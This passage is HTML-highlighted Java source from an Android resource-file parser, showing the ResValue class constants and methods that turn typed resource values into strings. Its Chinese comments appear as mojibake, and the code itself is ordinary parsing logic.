&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_FIRST_COLOR_INT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x1c&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_INT_COLOR_ARGB8&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x1c&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_INT_COLOR_RGB8&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x1d&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_INT_COLOR_ARGB4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x1e&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_INT_COLOR_RGB4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x1f&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_LAST_COLOR_INT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x1f&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_LAST_INT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x1f&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kt">int&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_UNIT_PX&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">0&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_UNIT_DIP&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_UNIT_SP&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">2&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_UNIT_PT&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">3&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_UNIT_IN&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">4&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_UNIT_MM&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">5&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_UNIT_SHIFT&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">0&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_UNIT_MASK&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">15&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_UNIT_FRACTION&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">0&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_UNIT_FRACTION_PARENT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_RADIX_23p0&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">0&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_RADIX_16p7&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_RADIX_8p15&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">2&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_RADIX_0p23&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">3&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_RADIX_SHIFT&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">4&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_RADIX_MASK&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">3&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_MANTISSA_SHIFT&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">8&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COMPLEX_MANTISSA_MASK&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">0xFFFFFF&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">short&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//ResValueçš„å¤´éƒ¨å¤§å°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">byte&lt;/span> &lt;span class="n">res0&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//ä¿ç•™ï¼Œå§‹ç»ˆä¸º0
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">byte&lt;/span> &lt;span class="n">dataType&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//æ•°æ®çš„ç±»å‹,å¯ä»¥ä»ä¸Šé¢çš„æšä¸¾ç±»å‹ä¸­è·å–
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//æ•°æ®å¯¹åº”çš„ç´¢å¼•
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">getSize&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">2&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">1&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">1&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">4&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">getTypeStr&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">switch&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">dataType&lt;/span>&lt;span class="o">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">TYPE_NULL&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;TYPE_NULL&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">TYPE_REFERENCE&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;TYPE_REFERENCE&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">TYPE_ATTRIBUTE&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;TYPE_ATTRIBUTE&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">TYPE_STRING&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;TYPE_STRING&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">TYPE_FLOAT&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;TYPE_FLOAT&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">TYPE_DIMENSION&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;TYPE_DIMENSION&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">TYPE_FRACTION&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;TYPE_FRACTION&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">TYPE_FIRST_INT&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;TYPE_FIRST_INT&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">TYPE_INT_HEX&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;TYPE_INT_HEX&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">TYPE_INT_BOOLEAN&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;TYPE_INT_BOOLEAN&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">TYPE_FIRST_COLOR_INT&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;TYPE_FIRST_COLOR_INT&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">TYPE_INT_COLOR_RGB8&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;TYPE_INT_COLOR_RGB8&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">TYPE_INT_COLOR_ARGB4&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;TYPE_INT_COLOR_ARGB4&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">TYPE_INT_COLOR_RGB4&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;TYPE_INT_COLOR_RGB4&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/*public String getDataStr(){
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> if(dataType == TYPE_STRING){
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> return ParseResourceUtils.getResString(data);
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> }else if(dataType == TYPE_FIRST_COLOR_INT){
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> return Utils.bytesToHexString(Utils.int2Byte(data));
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> }else if(dataType == TYPE_INT_BOOLEAN){
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> return data==0 ? &amp;#34;false&amp;#34; : &amp;#34;true&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> }
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> return data+&amp;#34;&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> }*/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">getDataStr&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">dataType&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TYPE_STRING&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">ParseResourceUtils&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getResString&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">dataType&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TYPE_ATTRIBUTE&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">String&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">format&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;?%s%08X&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">getPackage&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">),&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">dataType&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TYPE_REFERENCE&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">String&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">format&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;@%s%08X&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">getPackage&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">),&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">dataType&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TYPE_FLOAT&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">String&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">valueOf&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Float&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">intBitsToFloat&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">dataType&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TYPE_INT_HEX&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">String&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">format&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;0x%08X&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">dataType&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TYPE_INT_BOOLEAN&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="o">!=&lt;/span>&lt;span class="n">0&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="s">&amp;#34;true&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="s">&amp;#34;false&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">dataType&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TYPE_DIMENSION&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">Float&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">complexToFloat&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">))+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DIMENSION_UNITS&lt;/span>&lt;span class="o">[&lt;/span>&lt;span class="n">data&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">COMPLEX_UNIT_MASK&lt;/span>&lt;span class="o">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">dataType&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TYPE_FRACTION&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">Float&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">complexToFloat&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">))+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">FRACTION_UNITS&lt;/span>&lt;span class="o">[&lt;/span>&lt;span class="n">data&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">COMPLEX_UNIT_MASK&lt;/span>&lt;span class="o">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">dataType&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="n">TYPE_FIRST_COLOR_INT&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">dataType&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">TYPE_LAST_COLOR_INT&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">String&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">format&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;#%08X&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">dataType&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="n">TYPE_FIRST_INT&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">dataType&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">TYPE_LAST_INT&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">String&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">valueOf&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">String&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">format&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;0x%X, type 0x%02X&amp;gt;&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">dataType&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">getPackage&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">id&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="n">24&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;android:&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
